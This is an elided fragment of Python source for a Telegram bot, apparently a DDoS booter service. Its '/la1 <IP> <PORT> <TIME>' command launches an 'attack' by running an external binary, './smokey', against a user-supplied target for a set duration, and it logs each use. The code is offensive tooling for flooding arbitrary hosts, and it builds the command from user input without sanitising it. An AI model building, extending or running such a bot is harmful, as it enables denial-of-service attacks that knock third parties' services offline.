...
def send_welcome(message):
    ...
    /id - Get your user ID
    /la1 <IP> <PORT> <TIME> - Launch attack
...
@bot.message_handler(commands=['la1'])
def handle_soul(message):
    ...
    try:
        ...
        if len(parts) != 4:
            bot.reply_to(message, "❌ Usage: /la1 <IP> <PORT> <TIME>")
            return
        ...
        def run_attack():
            try:
                subprocess.run(f"./smokey {target} {port} {duration} 699", 
        ...
        # Record logs
        record_command_logs(user_id, '/la1', target, port, duration)
